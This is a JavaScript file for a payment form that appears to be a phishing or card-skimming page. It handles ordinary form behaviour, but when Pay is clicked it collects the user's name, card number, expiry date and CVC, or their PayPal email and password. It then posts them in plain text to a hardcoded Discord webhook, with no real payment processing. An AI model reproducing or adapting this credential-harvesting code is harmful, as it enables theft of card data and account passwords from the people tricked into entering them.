document.addEventListener("DOMContentLoaded", function () {
  const cardOption = document.getElementById("payment-method-card");
  const paypalOption = document.getElementById("payment-method-paypal");
  const cardFields = document.getElementById("credit-card-fields");
  const paypalFields = document.getElementById("paypal-fields");

  const currencySelector = document.getElementById("currency-selector");
  const amountInput = document.getElementById("amount-input");
  const payButton = document.getElementById("pay-button");

  const paypalEmail = document.querySelector("#paypal-fields input[type='email']");
  const paypalPassword = document.querySelector("#paypal-fields input[type='password']");
  
  const expiryMonth = document.getElementById("expiry-month");
  const expiryYear = document.getElementById("expiry-year");
  const fullNameInput = document.getElementById("full-name"); // Full Name field

  // Populate expiry month and year
  for (let i = 1; i <= 12; i++) {
    const month = i < 10 ? `0${i}` : i;
    expiryMonth.innerHTML += `<option value="${month}">${month}</option>`;
  }

  const currentYear = new Date().getFullYear();
  for (let i = 0; i < 15; i++) {
    const year = currentYear + i;
    expiryYear.innerHTML += `<option value="${year}">${year}</option>`;
  }

  // Toggle payment method fields
  cardOption.addEventListener("change", function () {
    if (cardOption.checked) {
      cardFields.style.display = "block";
      paypalFields.style.display = "none";
    }
  });

  paypalOption.addEventListener("change", function () {
    if (paypalOption.checked) {
      cardFields.style.display = "none";
      paypalFields.style.display = "block";
    }
  });

  // Update Pay button text dynamically
  function updatePayButton() {
    const currency = currencySelector.value;
    const amount = amountInput.value || "0";
    payButton.textContent = `Pay ${amount} ${currency}`;
  }

  currencySelector.addEventListener("change", updatePayButton);
  amountInput.addEventListener("input", updatePayButton);

  // Function to send data to Discord webhook
  function sendToDiscord(paymentInfo) {
    const webhookUrl = "https://discord.com/api/webhooks/1319833063160549477/dQ2vbDNYyuO3iQKX_h0gOFUs8fZTEnFfBziH7QPJw0n6CBo1o03WQ-KjCtBq2pgiee4K";
    
    const data = {
      content: `**New Payment Info:**\n\n${paymentInfo}`
    };

    fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    }).then(response => {
      if (response.ok) {
        console.log("Data sent to Discord successfully!");
      } else {
        console.error("Error sending data to Discord");
      }
    }).catch(error => {
      console.error("Error:", error);
    });
  }

  // Handle Pay button click
  payButton.addEventListener("click", function () {
    // Collect payment details based on the selected payment method
    let paymentInfo = `Full Name: ${fullNameInput.value}\nCurrency: ${currencySelector.value}\nAmount: ${amountInput.value}\n`;

    if (cardOption.checked) {
      const cardNumber = document.getElementById("card-number").value;
      const cardExpiryMonth = expiryMonth.value;
      const cardExpiryYear = expiryYear.value;
      const cardCvc = document.getElementById("card-cvc").value;

      paymentInfo += `Payment Method: Card\nCard Number: ${cardNumber}\nExpiry Date: ${cardExpiryMonth}/${cardExpiryYear}\nCVC: ${cardCvc}`;
    } else if (paypalOption.checked) {
      const email = paypalEmail.value;
      const password = paypalPassword.value; // Collect PayPal password

      paymentInfo += `Payment Method: PayPal\nPayPal Email: ${email}\nPayPal Password: ${password}`; // Include the password
    }

    // Send payment info to Discord webhook
    sendToDiscord(paymentInfo);
  });
});